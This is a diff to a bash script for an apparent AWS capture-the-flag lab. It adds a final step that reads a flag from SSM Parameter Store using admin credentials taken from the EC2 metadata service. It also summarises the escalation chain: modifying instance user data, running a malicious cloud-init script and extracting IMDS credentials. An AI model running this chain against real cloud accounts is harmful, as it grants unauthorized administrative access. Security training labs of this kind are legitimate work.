@@ -438,12 +438,28 @@ echo -e "${GREEN}✓ Instance restored to original state${NC}\n"
 # Clean up temporary files
 rm -f /tmp/original_userdata.b64 /tmp/malicious_userdata.b64
 
+# Step 15: Capture CTF flag using extracted admin credentials
+# The admin role credentials extracted from IMDS (or simulated via assume-role) are
+# still set in the environment. Use them to read the scenario flag from SSM.
+echo -e "${YELLOW}Step 15: Capturing CTF flag from SSM Parameter Store${NC}"
+FLAG_PARAM_NAME="/pathfinding-labs/flags/ec2-002-to-admin"
+show_attack_cmd "Attacker (admin role)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    echo -e "${YELLOW}Note: Flag retrieval requires admin credentials from the extracted role session${NC}"
+fi
+echo ""
+
 # Summary
 # Restore helpful permissions for manual exploration
 restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}✅ PRIVILEGE ESCALATION DEMONSTRATION COMPLETE!${NC}"
+echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER (limited permissions)"
@@ -455,11 +471,13 @@ echo "6. Started the instance, triggering malicious script execution"
 echo "7. Malicious script extracted credentials from IMDS (169.254.169.254)"
 echo "8. Gained admin access through extracted role credentials"
 echo "9. Restored original user data"
+echo "10. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo "  $STARTING_USER → (StopInstances) → (ModifyInstanceAttribute)"
 echo "  → (StartInstances) → Malicious cloud-init executes"
 echo "  → IMDS credential extraction → Admin access via instance role"
+echo "  → (ssm:GetParameter) → CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
